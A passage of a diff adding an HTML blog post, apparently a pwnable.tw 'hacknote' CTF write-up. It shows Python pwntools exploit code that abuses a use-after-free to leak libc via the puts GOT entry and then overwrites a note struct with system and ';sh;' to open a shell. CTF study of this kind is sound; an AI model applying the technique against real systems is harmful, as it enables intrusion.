+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">skip_menu</span><span style="color:#323232;">():
+    r.recvuntil(</span><span style="color:#183691;">&#39;----------------------&#39;</span><span style="color:#323232;">)
+    r.recvuntil(</span><span style="color:#183691;">&#39;----------------------&#39;</span><span style="color:#323232;">)
+    r.recvuntil(</span><span style="color:#183691;">&#39;----------------------</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">)
+
+
+</span><span style="font-style:italic;color:#969896;"># Leak libc
+</span><span style="color:#323232;">add_note(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;a&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#0086b3;">2</span><span style="color:#323232;">)
+add_note(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;a&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#0086b3;">2</span><span style="color:#323232;">)
+
+delete_note(</span><span style="color:#0086b3;">1</span><span style="color:#323232;">)
+delete_note(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">)
+
+add_note(</span><span style="color:#0086b3;">32</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#0086b3;">10</span><span style="color:#323232;">)
+
+</span><span style="font-style:italic;color:#969896;"># This overwrites the note struct
+</span><span style="color:#323232;">add_note(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">, p32(</span><span style="color:#0086b3;">ADDR_PRINT_FUNC</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">p32(</span><span style="color:#0086b3;">ADDR_PUTS_GOT</span><span style="color:#323232;">))
+
+r.write(</span><span style="color:#183691;">&#39;3&#39;</span><span style="color:#323232;">)
+r.recvuntil(</span><span style="color:#183691;">&#39;Index :&#39;</span><span style="color:#323232;">)
+r.write(</span><span style="color:#183691;">&#39;1</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">)
+
+</span><span style="color:#0086b3;">LEAKED_ADDR </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">u32(r.recv(</span><span style="color:#0086b3;">4</span><span style="color:#323232;">))
+
+</span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LEAKED_ADDR </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#0086b3;">L_ADDR_PUTS
+ADDR_SYSTEM </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">L_ADDR_SYSTEM
+ADDR_BINSH </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#323232;">libc.search(</span><span style="color:#183691;">&quot;/bin/sh&quot;</span><span style="color:#323232;">).next()
+
+log.info(</span><span style="color:#183691;">&quot;Leaked address of puts [</span><span style="color:#0086b3;">%s</span><span style="color:#183691;">]&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(</span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">LEAKED_ADDR</span><span style="color:#323232;">)))
+log.info(</span><span style="color:#183691;">&quot;Found libc base [</span><span style="color:#0086b3;">%s</span><span style="color:#183691;">]&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(</span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">LIBC_BASE</span><span style="color:#323232;">)))
+log.info(</span><span style="color:#183691;">&quot;Found address of system [</span><span style="color:#0086b3;">%s</span><span style="color:#183691;">]&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(</span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">ADDR_SYSTEM</span><span style="color:#323232;">)))
+log.info(</span><span style="color:#183691;">&quot;Found address of &#39;/bin/sh&#39; [</span><span style="color:#0086b3;">%s</span><span style="color:#183691;">]&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(</span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">ADDR_BINSH</span><span style="color:#323232;">)))
+
+delete_note(</span><span style="color:#0086b3;">3</span><span style="color:#323232;">)
+
+</span><span style="font-style:italic;color:#969896;">#Create shell
+
+</span><span style="color:#323232;">log.info(</span><span style="color:#183691;">&#39;Attempting to create shell&#39;</span><span style="color:#323232;">)
+add_note(</span><span style="color:#0086b3;">8</span><span style="color:#323232;">, p32(</span><span style="color:#0086b3;">ADDR_SYSTEM</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#183691;">&#39;;sh;&#39;</span><span style="color:#323232;">)
+
+r.write(</span><span style="color:#183691;">&#39;3&#39;</span><span style="color:#323232;">)
+r.recvuntil(</span><span style="color:#183691;">&#39;Index :&#39;</span><span style="color:#323232;">)
+r.write(</span><span style="color:#183691;">&#39;1&#39;</span><span style="color:#323232;">)
+
+r.interactive()
+</span></code></pre>
+<p><img src="/posts/pwnable-tw-hacknote/5d07ec98508cb0091260f637.png" alt="" /></p>
+
+</div>
+
+
+</div>
+
+<script src="https://utteranc.es/client.js"
+        repo="srikavin/blog"
+        issue-term="url"
+        label="💬comments"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </div>
+</section>
+
+<script src="/bundle.js"></script>
+ 
+
+</body>
+
+</html>
